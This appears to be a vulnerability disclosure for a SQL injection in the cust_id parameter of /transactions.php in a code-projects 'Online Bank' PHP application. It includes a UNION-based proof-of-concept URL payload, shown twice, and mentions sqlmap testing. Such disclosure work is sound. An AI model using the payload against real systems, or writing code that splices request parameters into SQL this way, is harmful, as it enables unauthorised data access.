# Summary
There is a sql injection vulnerability in code-project Online Bank (https://code-projects.org/online-bank-in-php-css-javascript-and-mysql-free-download/).

Affected component is `/transactions.php`.

# Details
First, login as **ADMIN**.

In `/transactions.php?cust_id=1`,
parameter `cust_id` is vulnerable to sql injection, 
![image](https://github.com/user-attachments/assets/c8a2c330-1ccf-42d5-aa46-8fe286cfd82b)

PoC:
```
/transactions.php?cust_id=1 UNION ALL SELECT CONCAT(CONCAT('qzbkq','eJuZjXkjfbsVDhPzzMltlPckaZBgiZDLFShbjjuR'),'qpkxq'),NULL,NULL,NULL,NULL,NULL-- DdGj
```
![image](https://github.com/user-attachments/assets/2abe05da-6bd0-4926-be67-92ffbb3b99ff)


we can use `sqlmap` to test:
![image](https://github.com/user-attachments/assets/4ff024f0-3601-4036-8b3b-dfce893ae959)




Audit the code, in `transactions.php`, there is no filter for `$_GET['cust_id']`:
![image](https://github.com/user-attachments/assets/83fb5ba1-4762-494a-954d-a283f431b7a0)


and these parameters are directly spliced into `$sql0`, which leads to sql injection vulnerability.



# PoC
```
/transactions.php?cust_id=1 UNION ALL SELECT CONCAT(CONCAT('qzbkq','eJuZjXkjfbsVDhPzzMltlPckaZBgiZDLFShbjjuR'),'qpkxq'),NULL,NULL,NULL,NULL,NULL-- DdGj
```
![image](https://github.com/user-attachments/assets/2abe05da-6bd0-4926-be67-92ffbb3b99ff)

![image](https://github.com/user-attachments/assets/4ff024f0-3601-4036-8b3b-dfce893ae959)
